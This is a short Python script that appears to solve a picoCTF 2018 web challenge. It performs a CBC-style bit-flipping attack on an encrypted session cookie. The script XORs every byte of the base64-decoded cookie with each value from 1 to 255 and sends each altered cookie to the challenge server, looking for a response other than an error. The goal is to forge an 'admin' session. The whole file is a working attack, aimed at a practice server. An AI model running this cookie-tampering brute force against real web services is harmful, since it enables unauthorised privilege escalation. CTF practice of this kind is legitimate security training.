import requests
import time
import base64 as b64
from pwn import *


#cookie=9zjeQ2iY24geZP3wsVuP40UbJTtPh3mTbJkZ2ionos9rAJnZb8iLk3T3DymL9JkbzgpjONGrukeuAnxQhDb9yd8cisYZgoItDe51NEtrukA=
#decode for {"username": "bdmin", "admin": 0, "password": "asd"}
DEBUG = False
url = "http://2018shell1.picoctf.com:43731/flag"
cookie = b64.b64decode("9zjeQ2iY24geZP3wsVuP40UbJTtPh3mTbJkZ2ionos9rAJnZb8iLk3T3DymL9JkbzgpjONGrukeuAnxQhDb9yd8cisYZgoItDe51NEtrukA=")
header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'}

temp = ''
for val in range(1,256):
	for i in range(0, len(cookie)):
		temp = cookie[:i]+chr( ord(cookie[i]) ^ val )+ cookie[i+1:]
		new_cookie = {"cookie": b64.b64encode(temp)}
		if DEBUG == True:
			print "[+] Debug original: \n" + hexdump(cookie)
			print "[+] Debug modified: \n" + hexdump(temp)		
			print "[+] new_cookie: " + b64.b64encode(temp)
		req = requests.get(url, cookies=new_cookie, headers=header)
		if req.status_code != 500:
			print req.text


